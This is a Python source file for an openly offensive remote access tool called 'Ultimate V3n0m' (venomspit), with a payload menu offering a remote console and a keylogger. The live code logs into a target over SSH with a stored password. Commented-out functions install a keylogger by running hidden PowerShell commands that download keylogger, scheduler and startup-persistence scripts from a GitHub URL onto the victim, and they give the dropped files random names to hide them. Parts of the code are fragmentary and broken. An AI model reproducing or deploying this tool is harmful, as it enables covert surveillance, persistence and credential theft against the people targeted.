#!/usr/bin/python
#python console

import os
import sys
import random as r
import getpass
#from paramiko import SSHClient
from modules import *

#variables
banner = """

	[::] Ultimate V3n0m [::]

		*****************
		 ***************
		  *************
		   ****(*)****
		    *********
			 *******
			  *****
			   ***
			    *

"""
help_menu = """
	
	
	Arguments:
		XXX.rat = configuration file to add to venomspit
	
	Example:
		python3 main.py -f venomspit.rat
"""
options_menu = """
	[*] Select a number to select a payload [*]	
	
	Payloads:
		[0] Remote Console
		[1] Keylogger
"""

username = getpass.getuser()
header = f"[~] {username}@venomspit $"
remote_path = "https://github.com/P0k3m0n-unleashed/ProjSucc/tree/master/Venom"
local_path = f"/home/{username}/.Venom" if username != "root" else "/root/.Venom"

#random text generator for obfuscation
def random_text():
	lower_case = "abcdefghijklmnopqrstuvwxyz"
	upper_case = "abcdefghijklmnopqrstuvwxyz".upper()

	characters = lower_case + upper_case
	generated_text = ""

	for i in range(10):
		 generated_text += r.choice(list(characters))

	return generated_text

#read config file
def read_config(config_file):
	configuration = {}
	
	#get file contents
	read_lines = open(config_file, "r").readlines()
	
	#get target configuration
	configuration["IPADDRESS"] = read_lines[0].strip()
	configuration["PASSWORD"] = read_lines[1].strip()
	configuration["WORKINGDIRECTORY"] = (read_lines[2]).replace("\\", "/").strip()
	# configuration["STARTUPDIRECTORY"] = (read_lines[3]).replace("\\", "/").strip()
	
	return configuration

def clear():
	os.system("clear")
	
def os_detection():
	#windows
	if os.name == "nt":
		return "w"
		#other
	if os.name == "posix":
		return "l"
	
#connects rat to taarget
def connect(address, password):
	
	#REMOTELY connect
	os.system(f"sshpass -p \"{password}\" ssh venomspit@{address}")
	 
# #remote upload with scp
# def remote_upload(address, password, upload, path):
# 	#scp upload
# 	os.system(f"sshpass -p \"{password}\" scp {upload} venomspit@{address}:{path}")
# f keylogger(address, password, startup_directory, working_directory):

# 	#Prepping
# 	print("\n[+]...Prepping Keylogger...")

# 	#web requests
# 	keylogger_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/keylogger.ps1 -OutFile {working_directory}/KVbOiPPcus.ps1\""

# 	scheduler_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/scheduler.ps1 -OutFile {working_directory}/SSzsjvouBw.ps1\""

# 	controller_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/controller.cmd -OutFile \"{startup_directory}/qdObbfWbxi.cmd\""

# 	#remote command execution
# 	print("[*] Installing Keylogger....")
# 	remote_command(address, password, keylogger_command)

# 	print("[*] Installing Scheduler....")
# 	remote_command(address, password, scheduler_command)

# 	print("[*] Installing Controller....")
# 	remote_command(address, password, controller_command)

# 	print("[+] Keylogger installed Successfully")

#remote download with scp
#def remote_download(address, password, download, path):
	#scp download
	# os.system(f"sshpass -p \"{password}\" scp -r venomspit@{address}:{path} {local_path}")


#run commmands remotely with SCP
# def remote_command(address, password, command):
# 	#remote command execution
# 	os.system(f"sshpass -p \"{password}\" ssh venomspit@{address} '{command}'")

#keylogger
# de
	# #building controller
	# with open(obfuscated_controller, "w") as f:
	# 	f.write("@echo off")
	# 	f.write(f"powershell Start-Process powershel.exe -windowstyle hidden \{}")

	#remote_upload
	# remote_upload(ipv4, password, obfuscated_controller, startup_directory) #controller
	# remote_upload(ipv4, password, obfuscated_keylogger, working_directory) #keylogger
	# remote_upload(ipv4, password, obfuscated_scheduler, working_directory) #scheduler


#terminate program
def exit():
	print("[!!] Exiting... [!!]")
	sys.exit()
	
# cli interfce
def cli(arguments):
	#display banner
	print(banner)
	#if args exist
	if arguments:
		print(options_menu)
		
		option = input(f"{header}")
		
		try:
			configuration = read_config(sys.argv[1])
		
		except FileNotFoundError:
			print("\n[!!] File does not exist [!!]")
			exit()
	
		#get config info
			ipv4 = configuration.get("IPADDRESS")
			password = configuration.get("PASSWORD")
			working_directory = (configuration.get("WORKINGDIRECTORY"))
			# startup_directory = (configuration.get("STARTUPDIRECTORY"))
			
		#remote console
	if option == "0":
		connect(ipv4, password)

	# 	#keylogger option
	# elif option ==  "1":
	# 	keylogger(ipv4, password, startup_directory, working_directory)
	# #if not
	else:
		print(help_menu)
	

#main code
def main():

	# checks for args
	try:
		sys.argv[1]
	except IndexError:
		arguments_exist = False
	else:
		arguments_exist = True
		
	cli(arguments_exist)
	
	pass

#runs main code
if __name__ == "__main__":
	main()
